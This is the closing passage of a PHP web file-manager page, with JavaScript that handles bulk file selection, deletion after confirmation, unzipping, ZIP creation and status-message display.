<button type="submit" class="btn-neon" style="width:100%;margin-top:10px">Download</button>
</form></div></div></div>
<?php endif;?>

<script>
let selected=[];function toggleAll(){
const cbs=document.querySelectorAll('.bulk-checkbox:not(#selectAll)');
const all=document.getElementById('selectAll').checked;
cbs.forEach(cb=>{cb.checked=all;if(all)selected.push(cb.value);else selected=[];});
updateSel();}
function updateSel(){
selected=[];document.querySelectorAll('.bulk-checkbox:not(#selectAll)').forEach(cb=>{
if(cb.checked)selected.push(cb.value);});
const bar=document.getElementById('bulkActionsBar');
const cnt=document.getElementById('selectedCount');
const all=document.getElementById('selectAll');
if(selected.length>0){
bar.style.display='flex';cnt.textContent=selected.length+' selected';
all.checked=document.querySelectorAll('.bulk-checkbox:not(#selectAll)').length===selected.length;}
else{bar.style.display='none';all.checked=false;}}
function clearSel(){
document.querySelectorAll('.bulk-checkbox').forEach(cb=>cb.checked=false);
selected=[];updateSel();}
function doBulk(action){
if(selected.length===0){alert('Select files first!');return;}
if(action==='delete'&&!confirm(`Delete ${selected.length} items?`))return;
if(action==='unzip'){
const zips=selected.filter(f=>f.toLowerCase().endsWith('.zip'));
if(zips.length===0){alert('No ZIP files selected');return;}
if(!confirm(`Unzip ${zips.length} files?`))return;}
document.getElementById('bulkAction').value=action;
document.getElementById('bulkForm').submit();}
function showZipForm(){
document.getElementById('zipForm').style.display='block';}
function createZip(){
const zipName=document.getElementById('customZipName').value||'';
if(selected.length===0){alert('Select files first!');return;}
document.getElementById('bulkAction').value='zip';
document.getElementById('zipName').value=zipName;
document.getElementById('bulkForm').submit();}
function selectAllFiles(){
document.querySelectorAll('.bulk-checkbox').forEach(cb=>cb.checked=true);
updateSel();}
document.addEventListener('DOMContentLoaded',function(){
updateSel();const msg=document.getElementById('msg');
if(msg){msg.style.display='block';setTimeout(()=>msg.style.display='none',4000);}
const urlParams=new URLSearchParams(window.location.search);
if(urlParams.has('msg')){
alert(urlParams.get('msg'));
window.history.replaceState({},document.title,window.location.pathname+'?dir=<?=urlencode($dir)?>');}
});
</script></body></html>